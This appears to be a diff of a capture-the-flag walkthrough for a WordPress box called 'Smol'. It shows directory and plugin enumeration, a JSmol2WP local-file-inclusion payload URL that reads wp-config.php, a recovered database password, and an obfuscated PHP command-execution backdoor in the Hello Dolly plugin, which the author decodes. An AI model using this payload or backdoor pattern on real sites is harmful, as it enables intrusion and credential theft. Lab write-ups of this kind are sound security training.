@@ -46,14 +46,41 @@ sudo vim /etc/hosts
 ```
 
 Now, we have the website working and showing the web page.
+
 ![[Smol_webpage.png]]
 
-Inside the `RCE` title, there's a `Comment` section where it says `You must be logged in to post a comment.` When we click the `logged in` section, we get the `wp-login.php` web page 
+Inside the `RCE` title, there's a `Comment` section where it says `You must be logged in to post a comment.` When we click the `logged in` section, we get the `wp-login.php` web page. We can also get there by directory enumeration.
+
 ![[wp.png]]
+#### Gobuster
+```bash
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u www.smol.thm > gobuster       
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://www.smol.thm
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
+/wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]
+
+===============================================================
+Finished
+===============================================================
+```
+
 Now, that we have found that the website is using the `wordpress` we can use tools like `wpscan`.
 #### WPScan Tool with an API-Token
 ```bash
-wpscan --url http://www.smol.thm --api-token 8c1tSzN2fQlS6k1EDl5a3rOlFLaAbkXAsCrkxsRv1LU
+wpscan --url http://www.smol.thm --api-token 8c1tS-----------------------1LU
 
 [+] jsmol2wp
  | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
@@ -83,10 +110,7 @@ wpscan --url http://www.smol.thm --api-token 8c1tSzN2fQlS6k1EDl5a3rOlFLaAbkXAsCr
  |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 ```
 
-The `version 1.07` and below are vulnerable and we can also see the location of the `jsmol2wp`. So, we navigate to that location and found a few folders and files. So, I searched for the `jsmol2wp exploit` and there are a few mentioning `WordPress JSmol2WP <=1.07 - Local File Inclusion`, that is the version we found from earlier `wpscan'. There's also a github website for CVE-2018-20463.
-
-
-At the same time, we can also use the `Nmap Script` to enumerate further.
+The `version 1.07` and below are vulnerable and we can also see the location of the `jsmol2wp`. At the same time, we can also use the `Nmap Script` to enumerate further.
 #### Nmap Script
 ```bash
 nmap -p80 --script http-wordpress-enum,http-wordpress-users 10.10.244.177
@@ -112,15 +136,38 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
 ```
 
-We've managed to get a few `wordpress users` as well.
+We've managed to get a few `wordpress users` from the nmap script enumeration.
 
-
-
-
-
+After the nmap script is complete, we navigated to that location `http://www.smol.thm/wp-content/plugins/jsmol2wp/` and found few folders and files. So, I searched for the `jsmol2wp exploit` and there are a few mentioning `WordPress JSmol2WP <=1.07`, so we followed the `wpscan` website which has the `Local File Inclusion (LFI): http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php.` 
 
 ---
 ### Initial Access
+
+We changed the `localhost:8000` to `www.smol.thm` and we used this to get the `wp-config.php` file.
+![[wp-config.png]]
+
+Inside this file is a password of the `wpuser: kbLSF2Vop#lw3rjDZ629*Z%G`. We used these creds to login to the wordpress and it worked. Under `Pages --> Webmaster Tasks`, there's some kind of `to-do list.`
+
+![[Webmaster-tasks.png]]
+
+The first tasks hints us that there could be a `Hello Dolly` plugin vulnerability. 
+#### What is `Hello Dolly` Plugin?
+**Hello Dolly** is a simple WordPress plugin that comes `preinstalled` in WordPress. It displays random lines from the song `Hello Dolly` by Louis Armstrong in the WordPress dashboard.
+
+Since, we have found the plugin is installed in the WordPress we can try to Directory Traversal to `plugins`. At the moment, we are here: `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/` and we need to go back two steps to `http://www.smol.thm/wp-content/plugins/` to access `hello.php.` So, the complete address will look like this: `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php.`
+
+Using the Directory Traversal/LFI, we have managed to get the `hello.php` plugin's content.
+
+![[hello.png]]
+
+There's a base64 encoded code. Let's decode it.
+```bash
+echo 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=' | base64 -d
+```
+
+We get this code from the base64 encoded code: `if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }`. This line is using obfuscated PHP code - octal and hexadecimal character encoding and upon further decoding this, we get: `if (isset($_GET["cmd"])) { system($_GET["cmd"]); }.`
+
+
 
 
 ---
